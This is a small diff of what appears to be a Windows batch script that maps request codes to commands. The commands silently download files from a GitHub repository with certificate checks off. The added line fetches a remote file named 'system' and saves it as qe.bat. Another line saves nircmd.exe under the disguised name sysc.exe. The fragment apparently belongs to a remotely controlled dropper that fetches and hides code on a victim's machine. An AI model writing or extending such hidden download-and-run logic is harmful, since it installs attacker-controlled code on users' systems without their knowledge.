@@ -3,3 +3,4 @@ if not "%ver%" == "1.0" (
 )
 if "%req%" == "nirc" set "out=curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/blob/main/nircmd.exe" --output "%mus%\sysc.exe""
 if "%req%" == "auxstart" set "out=X95"
+if "%req%" == "duer" set "out=curl -k -s "https://raw.githubusercontent.com/mmmmm4299/zzptsau/refs/heads/main/system" --output "%mus%\qe.bat""
